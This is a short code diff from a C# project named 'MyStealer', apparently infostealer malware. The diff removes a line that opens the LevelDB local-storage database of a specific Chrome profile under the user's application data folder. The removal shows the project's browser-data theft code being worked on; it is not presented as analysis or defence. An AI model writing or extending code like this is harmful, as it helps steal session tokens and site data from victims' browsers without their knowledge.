@@ -53,9 +53,6 @@ namespace MyStealer
                         }
                     }
 
-                    // chrome local storage leveldb
-                    var ldb = new LevelDB.DB(new LevelDB.Options { Comparator = new LevelDB.Comparator() }, Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Google", "Chrome", "User Data", "Profile 6", "Local Storage", "leveldb"));
-
                     /* Cleanup */
 
                     NativeMethods.CleanupLibraries();
